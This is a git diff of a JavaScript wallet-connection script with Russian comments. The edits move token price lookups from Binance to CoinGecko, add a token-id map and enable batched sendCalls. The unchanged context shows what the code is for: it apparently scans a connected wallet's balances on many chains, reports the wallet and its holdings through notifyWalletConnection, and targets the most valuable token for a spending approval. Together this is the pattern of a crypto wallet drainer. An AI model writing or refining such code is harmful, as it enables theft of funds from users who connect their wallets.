@@ -5,7 +5,7 @@ import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunct
 import { readContract, writeContract, sendCalls, getBalance } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = false;
+const USE_SENDCALLS = true;
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -532,6 +532,60 @@ const erc20Abi = [
   }
 ]
 
+// Маппинг символов токенов на идентификаторы CoinGecko
+const tokenIdMap = {
+  'ETH': 'ethereum',
+  'BNB': 'binancecoin',
+  'MATIC': 'matic-network',
+  'AVAX': 'avalanche-2',
+  'FTM': 'fantom',
+  'CELO': 'celo',
+  'USDT': 'tether',
+  'USDC': 'usd-coin',
+  'DAI': 'dai',
+  'WBTC': 'wrapped-bitcoin',
+  'UNI': 'uniswap',
+  'LINK': 'chainlink',
+  'COMP': 'compound-governance-token',
+  'YFI': 'yearn-finance',
+  'CRV': 'curve-dao-token',
+  'BAT': 'basic-attention-token',
+  'ZRX': '0x',
+  'LRC': 'loopring',
+  'SHIB': 'shiba-inu',
+  'PEPE': 'pepe',
+  'LEASH': 'doge-killer',
+  'FLOKI': 'floki',
+  'AAVE': 'aave',
+  'RNDR': 'render-token',
+  'MKR': 'maker',
+  'SUSHI': 'sushi',
+  'GLM': 'golem',
+  'REP': 'augur',
+  'SNT': 'status',
+  'STORJ': 'storj',
+  'CAKE': 'pancakeswap-token',
+  'BAKE': 'bakerytoken',
+  'XVS': 'venus',
+  'ALPACA': 'alpaca-finance',
+  'AUTO': 'cube',
+  'BURGER': 'burger-swap',
+  'EPS': 'ellipsis',
+  'BELT': 'belt',
+  'MBOX': 'mobox',
+  'SFP': 'safepal',
+  'BabyDoge': 'baby-doge-coin',
+  'EGC': 'evergrowcoin',
+  'QUACK': 'richquack',
+  'PIT': 'pitbull',
+  'QUICK': 'quickswap',
+  'GHST': 'aavegotchi',
+  'DFYN': 'dfyn-network',
+  'FISH': 'polycat-finance',
+  'ICE': 'ice-token',
+  'DC': 'dogechain'
+}
+
 const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
   if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
     console.error(`Invalid or missing address: ${address}, tokenAddress: ${tokenAddress}`)
@@ -604,20 +658,14 @@ const waitForAllowance = async (wagmiConfig, userAddress, tokenAddress, contract
 
 const getTokenPrice = async (symbol) => {
   try {
-    // Для нативных токенов используем соответствующие торговые пары
-    const symbolMap = {
-      'ETH': 'ETHUSDT',
-      'BNB': 'BNBUSDT',
-      'MATIC': 'MATICUSDT',
-      'AVAX': 'AVAXUSDT',
-      'FTM': 'FTMUSDT',
-      'CELO': 'CELOUSDT'
-    }
-    const apiSymbol = symbolMap[symbol] || `${symbol}USDT`
-    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${apiSymbol}`)
+    const coinId = tokenIdMap[symbol] || symbol.toLowerCase()
+    const response = await fetch(
+      `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`
+    )
     if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)
     const data = await response.json()
-    return Number(data.price) || 0
+    const price = data[coinId]?.usd || 0
+    return Number(price)
   } catch (error) {
     store.errors.push(`Error fetching price for ${symbol}: ${error.message}`)
     return 0
@@ -748,7 +796,6 @@ const initializeSubscribers = (modal) => {
       }
       const balancePromises = []
       Object.entries(networkMap).forEach(([networkName, networkInfo]) => {
-        // Добавляем запрос баланса нативного токена
         balancePromises.push(
           getNativeBalance(wagmiAdapter.wagmiConfig, state.address, networkInfo.chainId)
             .then(balance => ({
@@ -768,7 +815,6 @@ const initializeSubscribers = (modal) => {
               decimals: 18
             }))
         )
-        // Запрос балансов ERC-20 токенов
         const tokens = TOKENS[networkName] || []
         tokens.forEach(token => {
           if (isAddress(token.address)) {
@@ -813,7 +859,7 @@ const initializeSubscribers = (modal) => {
       await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
       
       if (mostExpensive) {
-        console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`)
+        console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USD: ${mostExpensive.price}`)
         
         if (mostExpensive.address === 'native') {
           console.log('Most expensive asset is native token, skipping approval')
@@ -881,7 +927,7 @@ const initializeSubscribers = (modal) => {
           }
         }
         
-        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price}`)
+        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USD: ${mostExpensive.price}`)
         const targetNetworkInfo = networkMap[mostExpensive.network]
         if (!targetNetworkInfo) {
           const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
